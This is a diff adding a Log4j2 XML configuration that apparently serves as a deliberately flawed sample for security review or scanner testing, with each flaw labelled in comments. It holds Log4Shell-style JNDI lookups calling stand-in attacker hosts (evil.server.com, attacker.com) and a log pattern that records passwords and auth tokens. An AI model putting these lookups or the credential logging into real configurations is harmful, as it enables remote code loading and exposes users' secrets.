@@ -1,0 +1,56 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Configuration status="ERROR" monitorInterval="60">
+    
+    <Properties>
+        <!-- VULNERABLE: Contains JNDI lookup (Log4Shell) -->
+        <Property name="APP_NAME">${jndi:ldap://evil.server.com/app}</Property>
+        <Property name="LOG_PATTERN">%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n</Property>
+    </Properties>
+    
+    <Appenders>
+        <Console name="Console" target="SYSTEM_OUT">
+            <!-- VULNERABLE: Pattern with JNDI lookup -->
+            <PatternLayout pattern="%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - ${jndi:dns://attacker.com/} %msg%n"/>
+        </Console>
+        
+        <File name="FileAppender" fileName="/tmp/app.log">
+            <!-- PERFORMANCE ISSUE: Location info enabled -->
+            <PatternLayout pattern="%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %C.%M(%F:%L) - %msg%n"/>
+        </File>
+        
+        <!-- SECURITY RISK: Logs potentially sensitive data -->
+        <RollingFile name="SecurityLogAppender" 
+                     fileName="/var/log/security.log"
+                     filePattern="/var/log/security-%d{yyyy-MM-dd}.log">
+            <PatternLayout pattern="%d - User: %X{username} Password: %X{password} Token: %X{authToken} - %msg%n"/>
+            <Policies>
+                <TimeBasedTriggeringPolicy/>
+            </Policies>
+        </RollingFile>
+        
+    </Appenders>
+    
+    <Loggers>
+        <!-- PROBLEMATIC: Too many DEBUG loggers for production -->
+        <Logger name="com.example" level="DEBUG" additivity="false">
+            <AppenderRef ref="Console"/>
+            <AppenderRef ref="FileAppender"/>
+        </Logger>
+        
+        <Logger name="com.example.auth" level="TRACE" additivity="false">
+            <AppenderRef ref="SecurityLogAppender"/>
+        </Logger>
+        
+        <Logger name="org.springframework.security" level="DEBUG" additivity="false">
+            <AppenderRef ref="SecurityLogAppender"/>
+        </Logger>
+        
+        <!-- Root with DEBUG level (inappropriate for production) -->
+        <Root level="DEBUG">
+            <AppenderRef ref="Console"/>
+            <AppenderRef ref="FileAppender"/>
+        </Root>
+        
+    </Loggers>
+    
+</Configuration>
